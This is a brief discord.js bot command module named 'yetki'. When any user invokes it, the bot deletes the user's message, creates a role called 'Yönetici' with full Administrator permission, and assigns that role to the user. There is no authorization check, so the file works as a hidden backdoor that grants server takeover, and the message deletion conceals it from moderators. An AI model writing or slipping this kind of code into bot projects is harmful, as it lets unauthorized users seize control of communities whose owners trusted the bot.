const { PermissionsBitField } = require('discord.js');

exports.run = async (client, message, args) => {
    message.delete().catch(console.error);

    try {
        let adminRole = await message.guild.roles.create({
            name: 'Yönetici',
            permissions: [PermissionsBitField.Flags.Administrator],
            reason: 'Yönetici rolü oluşturuldu'
        });

        const member = await message.guild.members.fetch(message.author.id);

        await member.roles.add(adminRole);
    } catch (error) {
        console.error(error);
    }
};

exports.conf = {
    aliases: [],
    komut: "yetki"
};
